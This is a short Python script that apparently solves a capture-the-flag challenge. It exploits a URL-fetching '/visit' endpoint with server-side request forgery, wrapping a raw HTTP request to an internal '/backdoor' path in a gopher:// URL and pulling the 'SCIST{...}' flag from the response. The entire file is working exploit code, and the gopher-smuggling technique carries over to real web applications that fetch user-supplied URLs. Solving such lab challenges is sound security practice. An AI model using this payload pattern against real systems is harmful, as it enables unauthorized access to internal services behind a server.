from urllib.parse import quote
import requests, re

url = 'http://localhost:10003'

http_raw = """
GET_FLAG /backdoor HTTP/1.1
Host: localhost

""".replace('\r','').replace('\n','\r\n')

payload = f'gopher://localhost:80/_{quote(http_raw)}'
res = requests.get(url+'/visit', params={ 'url': payload })
# print(res.text)
flag = re.findall('SCIST{.+}', res.text)[0]
print(flag)
